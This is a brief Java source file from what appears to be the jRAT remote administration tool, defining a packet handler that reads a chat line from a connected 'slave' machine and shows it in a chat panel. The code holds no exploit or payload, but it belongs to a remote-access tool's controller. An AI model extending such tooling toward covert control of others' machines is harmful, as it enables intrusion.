package jrat.module.chat;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.chat.ui.PanelChat;


public class PacketIncomingMessage implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
        String message = slave.readLine();

        PanelChat panel = (PanelChat) slave.getPanel(PanelChat.class);

		if (panel != null) {
			panel.addRemoteMessage(message);
		}
	}

}
